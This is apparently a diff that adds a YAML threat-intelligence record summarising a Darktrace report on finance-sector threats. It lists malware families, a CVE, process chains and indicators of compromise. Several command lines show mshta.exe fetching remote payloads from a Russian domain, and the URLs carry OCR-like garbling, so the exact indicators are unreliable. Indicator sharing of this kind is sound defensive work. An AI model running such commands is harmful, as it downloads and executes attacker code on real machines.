@@ -1,0 +1,50 @@
+description: The report discusses various cybersecurity threats targeting the finance
+  sector including phishing, data loss prevention challenges, evolving ransomware
+  tactics, pre-disclosure exploitation of edge devices, state-sponsored attacks from
+  DPRK-linked groups, and cloud/AI governance issues.
+malware_families:
+- BeaverTail
+- InvisibleFerret
+TTPs:
+  processes:
+  - mshta.exe
+  - explorer.exe
+  - winlogon.exe
+  - userinit.exe
+  commandline:
+  - C:\\WINDOWS\\System32\\mshta.exe hitps://weiss.neighbOrrolt.ru/rpxacc6dmshta
+  - hitps://weiss.neighbOrroll.ru/rpxacc84mshta
+  - hitps:/fweiss.neighbOrrolt.ru/rpxaccBamshta
+  - hitps:/iweiss.neighbOrrolt.ru/rpxacc64mshta
+  - hitps://weiss.neighb Orroltru/rpxTM
+  powershell: []
+  scripting_engine:
+  - mshta.exe
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - mshta.exe, weiss.neighbOrrolt.ru, 80
+  file_activity: []
+  persistence: []
+  process_relations:
+  - winlogon.exe -> userinit.exe -> explorer.exe -> mshta.exe
+CVEs:
+- CVE-2025-55182
+IOCs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - weiss.neighbOrrolt.ru
+  - yespp.co.kr
+  urls:
+  - hxxps://www[.]yespp[.]co[.]kr/common/include/code/out[.]php
+  - hitps://weiss.neighbOrrolt.ru/rpxacc6dmshta
+  - hitps://weiss.neighbOrroll.ru/rpxacc84mshta
+  - hitps:/fweiss.neighbOrrolt.ru/rpxaccBamshta
+  - hitps:/iweiss.neighbOrrolt.ru/rpxacc64mshta
+  - hitps://weiss.neighb Orroltru/rpxTM
+authors:
+- Nathaniel Jones
+reference: https://www.darktrace.com/blog/the-state-of-cybersecurity-in-the-finance-sector-six-trends-to-watch
+date_of_publication: February 02, 2026
+file_creation_date: February 02, 2026
